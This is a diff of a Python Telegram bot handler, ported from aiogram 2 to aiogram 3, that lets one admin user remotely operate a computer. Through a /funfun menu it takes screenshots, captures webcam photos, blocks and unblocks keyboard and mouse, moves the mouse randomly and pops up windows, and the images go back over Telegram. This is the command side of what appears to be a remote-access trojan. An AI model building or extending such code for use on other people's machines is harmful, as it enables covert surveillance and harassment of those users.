@@ -1,98 +1,159 @@
 import os
-from aiogram.contrib.fsm_storage.memory import MemoryStorage
-from aiogram.dispatcher.filters.state import State, StatesGroup
-from aiogram.types import ReplyKeyboardRemove, ReplyKeyboardMarkup
-from aiogram import types, Dispatcher
-from aiogram.dispatcher import FSMContext
-from Handlers.handlers import bot, dp, identify
-from Funcs import funcs
-from Keyboardz.keyboard_fun import *
+
+from aiogram import F, Router, types
+from aiogram.filters import Command
+from aiogram.fsm.context import FSMContext
+from aiogram.fsm.state import State, StatesGroup
+from aiogram.types import FSInputFile
+from environs import Env
+
+# Импорты логики
+from Funcs import fun_commands, funcs
 from Funcs.state import return_message
+from Keyboardz.keyboard_fun import keyBoard_funs, keyboard_wybor
+# Импортируем модуль сообщений (файл мы переименовали в fun_messages.py)
 from message_processing import fun_messages as fs
-from Funcs import fun_commands
+
+# 1. Переменные окружения
+env = Env()
+env.read_env()
+ADMIN_ID = env.int('id')
+
+router = Router()
+
+# 2. Состояния
 
 
-storage = MemoryStorage()
+class FunStates(StatesGroup):
+    waiting_for_action = State()  # Выбор действия (Скриншот, окно и т.д.)
+    waiting_for_input = State()   # Ввод значения (Текст окна, кол-во движений)
+
+# 3. Точка входа (/funfun)
 
 
-class statecomand(StatesGroup):
-    commandforfun = State()
-    zadacha = State()
+@router.message(Command("funfun"), F.from_user.id == ADMIN_ID)
+async def cmd_fun_start(message: types.Message, state: FSMContext):
+    await state.set_state(FunStates.waiting_for_action)
+    await message.answer(
+        "Глава интересное. Выберите действие:",
+        reply_markup=keyBoard_funs
+    )
+
+# 4. Обработка выбора действия
 
 
-async def menu_fun(message: types.Message):
-    if (message.from_id != identify):
-        await bot.send_message(message.from_user.id, "Неправильная команда")
+@router.message(FunStates.waiting_for_action, F.from_user.id == ADMIN_ID)
+async def process_fun_action(message: types.Message, state: FSMContext):
+    chosen_action = message.text
+
+    # Сохраняем выбор, пригодится если идем во второе состояние
+    await state.update_data(choosen=chosen_action)
+
+    # --- МГНОВЕННЫЕ ДЕЙСТВИЯ ---
+
+    if chosen_action == "Скриншот экрана":
+        await message.answer("Делаю скриншот...")
+        # ИСПРАВЛЕНО: Fun_funcs -> FunFuncs
+        fun_commands.FunFuncs.screenshot()
+
+        path = f'{funcs.PATH}ss.png'
+        try:
+            photo_file = FSInputFile(path)
+            await message.answer_photo(photo_file)
+            await message.answer(return_message("Скриншот готов\n"), reply_markup=types.ReplyKeyboardRemove())
+        except Exception as e:
+            await message.answer(f"Ошибка отправки: {e}")
+        finally:
+            if os.path.exists(path):
+                os.remove(path)
+
+        await state.clear()
+
+    elif chosen_action == "Фото с камеры":
+        await message.answer("Делаю фото...")
+        # ИСПРАВЛЕНО: Fun_funcs -> FunFuncs
+        fun_commands.FunFuncs.get_photo_from_camera()
+
+        path = f'{funcs.PATH}cam.png'
+        try:
+            photo_file = FSInputFile(path)
+            await message.answer_photo(photo_file)
+            await message.answer(return_message("Фото готово\n"), reply_markup=types.ReplyKeyboardRemove())
+        except Exception as e:
+            await message.answer(f"Ошибка камеры или отправки: {e}")
+        finally:
+            if os.path.exists(path):
+                os.remove(path)
+
+        await state.clear()
+
+    elif chosen_action == "Блок мышки и клавы":
+        # ИСПРАВЛЕНО: Fun_funcs -> FunFuncs
+        fun_commands.FunFuncs.block_input(True)
+        await message.answer(
+            return_message("Заблокировано (Клавиатура и Мышь)\n"),
+            reply_markup=types.ReplyKeyboardRemove()
+        )
+        await state.clear()
+
+    elif chosen_action == "Анблок мышки и клавы":
+        # ИСПРАВЛЕНО: Fun_funcs -> FunFuncs
+        fun_commands.FunFuncs.block_input(False)
+        await message.answer(
+            return_message("Разблокировано\n"),
+            reply_markup=types.ReplyKeyboardRemove()
+        )
+        await state.clear()
+
+    # --- ДЕЙСТВИЯ, ТРЕБУЮЩИЕ ВВОДА ---
+
+    elif chosen_action == "Вывод окна":
+        await state.set_state(FunStates.waiting_for_input)
+
+        # ИСПРАВЛЕНО: Funs_messages -> FunMessages
+        await message.answer(
+            fs.FunMessages.fun_segment(chosen_action),
+            reply_markup=keyboard_wybor
+        )
+
+    elif chosen_action == "Рандом с мышкой":
+        await state.set_state(FunStates.waiting_for_input)
+        # ИСПРАВЛЕНО: Funs_messages -> FunMessages
+        await message.answer(
+            fs.FunMessages.fun_segment(chosen_action),
+            reply_markup=types.ReplyKeyboardRemove()
+        )
+
     else:
-        await statecomand.commandforfun.set()
-        await bot.send_message(identify, "Глава интересное. Выберите действие", reply_markup=keyBoard_funs)
+        await state.set_state(FunStates.waiting_for_input)
+        # ИСПРАВЛЕНО: Funs_messages -> FunMessages
+        await message.answer(
+            fs.FunMessages.fun_segment(chosen_action),
+            reply_markup=types.ReplyKeyboardRemove()
+        )
+
+# 5. Ввод данных
 
 
-@dp.message_handler(state=statecomand.commandforfun)
-async def fun_command(message: types.Message, state: FSMContext):
+@router.message(FunStates.waiting_for_input, F.from_user.id == ADMIN_ID)
+async def process_fun_input(message: types.Message, state: FSMContext):
+    input_value = message.text
 
-    async with state.proxy() as data:
-        data['choosen'] = message.text
+    data = await state.get_data()
+    action = data.get('choosen')
 
-    if data['choosen'] == "Скриншот экрана":
-        fun_commands.Fun_funcs.screenshot()
-        photo = open(f'{funcs.PATH}ss.png', 'rb')
-        await bot.send_photo(identify, photo)
-        os.remove(f'{funcs.PATH}ss.png')
-        await bot.send_message(identify, return_message("Скриншот готов\n"))
-        await state.finish()
+    if action == "Рандом с мышкой":
+        try:
+            # ИСПРАВЛЕНО: Fun_funcs -> FunFuncs
+            fun_commands.FunFuncs.mouse_rand(input_value)
+            await message.answer(return_message("Процесс завершен.\n"))
+        except Exception as e:
+            await message.answer(f"Ошибка выполнения: {e}")
 
-    elif data['choosen'] == "Блок мышки и клавы":
-        fun_commands.Fun_funcs.blockUnblockKeyMouse(true)
-        await bot.send_message(identify, return_message("Заблокировано\n"))
-        await state.finish()
+    elif action == "Вывод окна":
+        # ИСПРАВЛЕНО: Fun_funcs -> FunFuncs
+        fun_commands.FunFuncs.window_warning(input_value)
+        await message.answer(return_message("Окно выведено.\n"))
 
-    elif data['choosen'] == "Анблок мышки и клавы":
-        fun_commands.Fun_funcs.blockUnblockKeyMouse(false)
-        await bot.send_message(identify, return_message("Заблокировано\n"))
-        await state.finish()
-
-    elif data['choosen'] == "Фото с камеры":
-        fun_commands.Fun_funcs.get_photo_from_camera()
-        photo = open(f'{funcs.PATH}cam.png', 'rb')
-        await bot.send_photo(identify, photo)
-        os.remove(f'{funcs.PATH}cam.png')
-        await bot.send_message(identify, return_message("Фото готово\n"))
-        await state.finish()
-
-    elif data['choosen'] == "Вывод окна":
-        await bot.send_message(identify, fs.Funs_messages.fun_segment(message.text), reply_markup=keyboard_wybor)
-        await statecomand.next()
-        await statecomand.zadacha.set()
-
-    else:
-        await bot.send_message(identify, fs.Funs_messages.fun_segment(data['choosen']))
-        await statecomand.next()
-        await statecomand.zadacha.set()
-
-    ReplyKeyboardRemove.remove_keyboard = True
-
-
-@dp.message_handler(state=statecomand.zadacha)
-async def second(message: types.Message, state: FSMContext):
-
-    async with state.proxy() as data:
-        data['values'] = message.text
-
-    if (data['choosen'] == "Рандом с мышкой"):
-        hren = data['values']
-        fun_commands.Fun_funcs.mouse_rand(hren)
-        await bot.send_message(identify, return_message(f"Процесс готово.\n"))
-
-    elif (data['choosen'] == "Вывод окна"):
-        hren = data['values']
-        fun_commands.Fun_funcs.window_warning(hren)
-        await bot.send_message(identify, return_message(f"Процесс готово.\n"))
-
-    ReplyKeyboardRemove.remove_keyboard = True
-
-    await state.finish()
-
-
-def register_handler_fun_command(dp: Dispatcher):
-    dp.register_message_handler(menu_fun, commands=['funfun'])
+    await message.answer("Готово", reply_markup=types.ReplyKeyboardRemove())
+    await state.clear()
